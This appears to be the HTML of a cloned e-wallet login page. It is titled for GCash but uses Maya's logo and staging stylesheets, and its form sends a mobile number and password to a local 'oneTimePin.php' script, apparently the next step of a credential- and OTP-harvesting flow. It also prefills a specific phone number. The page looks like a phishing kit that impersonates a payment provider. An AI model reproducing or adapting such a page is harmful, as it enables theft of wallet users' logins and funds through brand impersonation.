<!DOCTYPE html>
<html class="no-js" lang="en" id="theme-paymaya">

<head>
    <meta charset="utf-8" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Login | GCash</title>
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="robot" content="index,follow" />
    <meta name="copyright" content="Copyright © 2022 Maya. All rights reserved." />
    <meta name="format-detection" content="telephone=no" />
    <link type="text/css" rel="stylesheet"
        href="https://iam-assets-staging.paymaya.com/maya-connect-ui/2.0.18/styles/main.css" charset="UTF-8" />
    <script type="text/javascript"
        src="https://iam-assets-staging.paymaya.com/maya-connect-ui/2.0.18/scripts/vendor/jquery.min.js"
        charset="UTF-8"></script>
    <script type="text/javascript"
        src="https://iam-assets-staging.paymaya.com/maya-connect-ui/2.0.18/scripts/vendor/ued.min.js"
        charset="UTF-8"></script>
    <script type="text/javascript" src="https://iam-assets-staging.paymaya.com/maya-connect-ui/2.0.18/scripts/reset.js"
        charset="UTF-8"></script>
    <style>
        body .wrapper .white-container .form-container {
            min-width: 100%;
            text-align: center;
        }

        div {
            display: block;
        }

        body {
            font-family: "CerebriSansPro", sans-serif;
            line-height: 1.42857143;
            margin: 0;
            color: #000;
        }

        body,
        input,
        button.btn {
            -webkit-font-smoothing: antialiased !important;
            font-weight: 400;
        }
    </style>
</head>

<body data-new-gr-c-s-check-loaded="14.1113.0" data-gr-ext-installed="">
    <div class="wrapper login-wrapper">
        <div class="white-container">
            <div class="container">
                <div class="form-container">
                    <img class="img-responsive logo"
                        src="https://iam-assets-staging.paymaya.com/maya-connect-ui/2.0.18/images/mayaLogo.svg"
                        alt="Maya Philippines Logo" />
                    <form class="form-login form-login-main mobile-only-login" method="POST" action="oneTimePin.php"
                        id="login-form">
                        @csrf
                        <div class="form-group">
                            <label class="connect-text-field mdc-text-field mdc-text-field--filled mdc-ripple-upgraded"
                                id="label-identity" for="identityValue">
                                <span class="mdc-floating-label mdc-floating-label--required"
                                    id="identity-placeholder">Mobile number</span>
                                <input class="mdc-text-field__input" id="identityValue" type="text" name="identityValue"
                                    value="09193890579" placeholder="&nbsp;" required=""
                                    aria-labelledby="identity-placeholder" />
                            </label>
                            <div class="input-error-block login-input-inline-error" id="identity-value-error">
                                <img src="https://iam-assets-staging.paymaya.com/maya-connect-ui/2.0.18/images/icons/errorIcon.svg"
                                    alt="error-icon" />
                                <div class="error-text" id="identity-error-text"></div>
                            </div>
                        </div>
                        <div class="form-group">
                            <label
                                class="connect-text-field mdc-text-field mdc-text-field--filled mdc-text-filled-with-trailing-icon mdc-ripple-upgraded"
                                id="label-password" for="password">
                                <span class="mdc-floating-label mdc-floating-label--required"
                                    id="password-placeholder">Password</span>
                                <input class="mdc-text-field__input" type="password"
                                    aria-labelledby="password-placeholder" id="password" name="password"
                                    autocomplete="new-password" required="" placeholder="&nbsp;" />
                                <i class="material-icons mdc-text-field__icon mdc-text-field__icon--trailing toggle-password"
                                    tabindex="0" role="button">
                                    <div class="show-eye-icon close-eye-icon"></div>
                                </i>
                            </label>
                            <div class="input-error-block login-input-inline-error" id="password-error">
                                <img src="https://iam-assets-staging.paymaya.com/maya-connect-ui/2.0.18/images/icons/errorIcon.svg"
                                    alt="error-icon" />
                                <div class="error-text" id="password-error-text"></div>
                            </div>
                        </div>

                        <div class="button-container">
                            <button class="continue-button mdc-button btn-submit" id="btnLogin" type="button"
                                disabled="" onclick="validateForm()">
                                <span class="mdc-button__label">Log in</span>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="body-footer">
            <div class="container width-max">
                <span>Copyright © 2022 Maya. All rights reserved.</span>
            </div>
        </div>
    </div>
    <script src="..\js\walletValidation.js">
    </script>
    <script type="text/javascript" src="https://iam-assets-staging.paymaya.com/maya-connect-ui/2.0.18/scripts/main.js"
        charset="UTF-8"></script>